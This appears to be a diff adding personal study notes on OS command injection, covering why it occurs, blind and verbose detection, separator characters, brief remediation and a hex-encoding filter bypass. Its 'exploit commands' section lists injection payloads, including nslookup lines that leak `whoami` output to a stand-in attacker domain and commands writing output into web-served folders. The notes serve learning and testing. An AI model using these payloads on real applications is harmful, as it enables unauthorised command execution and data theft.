@@ -1,0 +1,37 @@
+Command Injection ->  vulnerability allowing you to execute commands through a vulnerable app, and its remediations.
+
+Why does this vulnerability occur:
+    This vulnerability exists because applications often use functions in programming languages such as PHP, Python and NodeJS to pass data to and 
+    to make system calls on the machine’s operating system
+
+Command Injection can be detected in mostly one of two ways:
+    1-Blind   command injection
+    2-Verbose command injection
+
+
+Detecting and exploit Blind Command Injection:
+    when the command injection occurs there is no output visable so we use 
+    1-ping or sleep (timeout in windows) command or 
+    2-using redirection [>],[>>] and cat this file to see output
+    3-and using [;,|,||,&,&&,0x0a,\n] or  `injected command`, $(injected command)
+    4-using nslookup in burp collaborator
+        -> & nslookup kgji2ohoyw.web-attacker.com &
+        -> & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+
+some exploit commands:
+    & ping -c 10 127.0.0.1 &
+    & whoami > /var/www/static/whoami.txt &
+    & nslookup kgji2ohoyw.web-attacker.com &
+    & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+    email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+    email=||whoami>/var/www/images/output.txt||
+
+prevented Command injection:
+    1-using input sanitisation    (greeter and the best way)
+    2-using pattern of characters (regular expression)
+
+how Bypassing Filters:
+    using hexdecimal value of your command
+
+command injection Cheat Sheet:
+    https://github.com/payloadbox/command-injection-payload-list
